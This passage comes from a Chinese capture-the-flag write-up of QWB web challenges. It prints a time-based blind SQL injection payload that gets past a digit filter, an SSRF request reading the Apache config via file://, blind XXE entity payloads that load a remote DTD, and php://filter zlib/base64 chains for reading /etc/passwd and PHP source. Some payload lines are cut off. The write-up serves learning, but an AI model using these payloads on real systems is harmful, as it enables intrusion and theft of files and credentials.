       1348831860
       1234567890123456
       1
    ''' % content
    print requests.post(url,data=data).content
通过提示存在注入，可以得到以下信息
    1521882365
    1234567890123456
绑定host: wc.qwb.com 的ip为39.107.33.77
其中message存在注入，限制的比较严格
    POST /leave_message.php HTTP/1.1
    Host: wc.qwb.com:8088
    user=aaaaaaaaaaaaaaa&email=PI:EMAIL&team=icq3be93d38562e68bc0a86368c2d6b2&message=1'-(sleep(ceil(pi())))-'1&submit=submit
比如sleep函数参数里面不能用数字，可以使用`pi()`来绕过，另外就是select from部分。
    message=12333'-(if(ascii(substring((select@b:=group_concat(username)from{cl0und.adminuser}),%s,1))like'%s',sleep(pi()),0))-'1
这里字段都需要猜解，猜不到password字段
利用密码找回功能，注入出code，找回管理员密码
进入后台后，发现有一段上传处，主要用于用户的头像上传。
文件上传后便会将图片的内容显示出来。
再往后面看htm中有一段注释。
其中urlink存在ssrf漏洞，没有限制协议以及后面的字符，当然大部分的特殊符号不能用，只能读取一些配置文件。
    POST /getimg.php HTTP/1.1
    Host: wc.qwb.com:8088
    Cookie: PHPSESSID=cjq7naar02kajivdftljhj2h44
    ------WebKitFormBoundaryOXFwabnsGhrKdxyn
    Content-Disposition: form-data; name="urlink"
    file://wc.qwb.com:8088/etc/apache2/apache2.conf
    ------WebKitFormBoundaryOXFwabnsGhrKdxyn--
读取到apache的配置文件，可以看到内容。很郁闷，比赛的时候读取了这个文件，但是base64的内容没取完整导致没看到这部分，还是需要细心…
    #
    #       Port    23333
    #   Options Indexes FollowSymLinks
    #   AllowOverride None
    #   Require all granted
    #   Here is a Bin with its libc
    #
剩下的就是文件读取pwn程序，然后pwnpwnpwn了，太菜了，不会做。
### 教育机构
这个题目其实特别懵逼，给了一个域名，还以为是要来一场真实环境渗透题，所以信息收集方面都做了。比如扫二级域名，扫端口，扫文件(一扫就被ban)
80端口看的实在懵逼，毫无头绪。就看了一下33899端口的东西，有一个.idea的泄露，但是并没有什么用。
内容被注释了一段xm调用实体的变量，有点想xxe。
还有一个地方就是提交评论的地方，但是无论怎么样写入都是`alert("未知错误！！！请重试")`
传入数组的时候发现出现问题了。
comment处有被userdecode处理过，试一下xml头，就可以看到有报错，考点应该就是xxe。
通过盲xxe，可以获取到文件。
远程服务器布置一个1.xml
    ">
    %int;
    %trick;
comment再进行调用
     %remote; ]>
获取一下`/var/www/52dandan.cc/public_html/config.php`
拿到了一半的flag
    Ok,you get the first part of flag : 5bdd3b0ba1fcb40
    then you can do more to get more part of flag
这里出现了一个问题，就是获取`/var/www/52dandan.cc/public_html/common.php`的时候出现了`Detected an
entity reference loop`错误。
查了一下资料，libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。[php过滤器](http://php.net/manual/zh/filters.compression.php)中提供了一个`zlib.inflate`压缩数据。
    压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
    解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");
这样就可以获取到`common.php`文件源码了!
再获取一下机器的一些ip信息，其中arp信息中保留了一个内网地址
    /proc/net/arp
    /etc/host
    IP address       HW type     Flags       HW address            Mask     Device
    192.168.223.18   0x1         0x2         02:42:c0:a8:df:12     *        eth0
    192.168.223.1    0x1         0x2         02:42:91:f9:c9:d4     *        eth0
开放了一个80端口，test.php的shop参数存在注入
    ">
    %int;
    %trick;
做不动了，不想做了。
2333，学习了一个防止扫描器的姿势，如果扫描器爬到test.php，当然对一般的目录扫描效果不大，一般都是HEAD请求。
test.php
know it then do it